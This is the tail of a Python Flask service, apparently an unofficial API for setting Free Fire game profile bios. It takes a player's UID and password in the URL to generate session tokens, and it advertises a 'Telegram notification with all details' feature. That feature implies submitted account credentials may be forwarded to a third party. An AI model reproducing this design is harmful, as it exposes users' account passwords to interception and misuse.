            "error": "Profile not found",
            "uid": uid
        }), 404
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e),
            "uid": uid
        }), 500

@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "success": True,
        "message": "Free Fire Bio API - Using search.py method",
        "endpoints": {
            "/bio_upload": "SET/UPDATE bio (auto generate JWT from UID/Pass)",
            "/generate_jwt": "Generate JWT only from UID/Pass",
            "/check_profile": "Check profile using protobuf method",
            "/": "This info page"
        },
        "usage": {
            "set_bio": "/bio_upload?bio=Hello&uid=UID&pass=PASSWORD&region=id"
        },
        "features": [
            "✅ Auto generate JWT from UID + Password",
            "✅ Profile check using protobuf + encrypt (search.py method)",
            "✅ Check all servers (ID, IND, BR, US, BD)",
            "✅ Get REAL NAME from server (not from API)",
            "✅ Telegram notification with all details"
        ],
        "profile_method": "protobuf (search.py)",
        "Credit": "sulav_codex_ff",
        "Telegram": "@sulav_don2"
    })

# ============ MAIN ============
if __name__ == "__main__":
    print("=" * 60)
    print("🔥 FREE FIRE BIO API - Using search.py method")
    print("=" * 60)
    print("📱 Profile Method: protobuf + encrypt (like search.py)")
    print("📱 Servers: ID, IND, BR, US, BD")
    print("🚀 Server running on http://0.0.0.0:5000")
    print("=" * 60)
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
